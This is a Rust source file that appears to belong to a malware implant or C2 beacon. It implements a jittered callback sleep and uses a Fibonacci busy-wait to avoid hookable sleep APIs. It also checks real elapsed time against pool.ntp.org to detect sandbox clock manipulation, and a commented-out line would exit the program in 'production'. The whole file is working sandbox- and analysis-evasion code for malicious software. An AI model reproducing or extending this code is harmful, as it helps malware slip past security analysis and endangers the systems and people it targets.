use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::net::UdpSocket;
use crate::config;

pub fn sleep_with_jitter() {
    let base_ms = config::callback_interval * 1000;
    let max_jitter_ms = base_ms * config::callback_jitter / 100;
    let jitter_ms = if max_jitter_ms > 0 {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        nanos % max_jitter_ms
    } else {
        0
    };

    let target = Duration::from_millis(base_ms + jitter_ms);

    // NTP timestamp before sleep
    let ntp_before = ntp_timestamp();

    // Computational sleep — Fibonacci busy-wait (avoids hookable sleep APIs)
    let start = Instant::now();
    let mut a: u128 = 0;
    let mut b: u128 = 1;
    while start.elapsed() < target {
        for _ in 0..10_000 {
            let tmp = a.wrapping_add(b);
            a = b;
            b = tmp;
        }
    }

    // NTP verification — confirm real time elapsed (defeats sandbox clock manipulation)
    let ntp_after = ntp_timestamp();
    if let (Some(before), Some(after)) = (ntp_before, ntp_after) {
        let elapsed_secs = after.saturating_sub(before);
        let expected_secs = target.as_secs();
        if elapsed_secs < expected_secs / 2 {
            eprintln!("[!] Sandbox detected: NTP elapsed {}s, expected {}s", elapsed_secs, expected_secs);
            // TODO: in production, exit instead:
            // std::process::exit(0);
        }
    } else {
        eprintln!("[*] NTP check skipped (unreachable)");
    }
}

fn ntp_timestamp() -> Option<u64> {
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?;

    // NTP version 3, client mode
    let mut packet = [0u8; 48];
    packet[0] = 0x1B;

    socket.send_to(&packet, "pool.ntp.org:123").ok()?;
    socket.recv_from(&mut packet).ok()?;

    // Transmit timestamp at byte 40 (seconds since 1900-01-01)
    let secs_since_1900 = u32::from_be_bytes([packet[40], packet[41], packet[42], packet[43]]);
    // Convert to Unix epoch (1900-01-01 to 1970-01-01 = 2208988800 seconds)
    let unix_secs = secs_since_1900 as u64 - 2_208_988_800;
    Some(unix_secs)
}
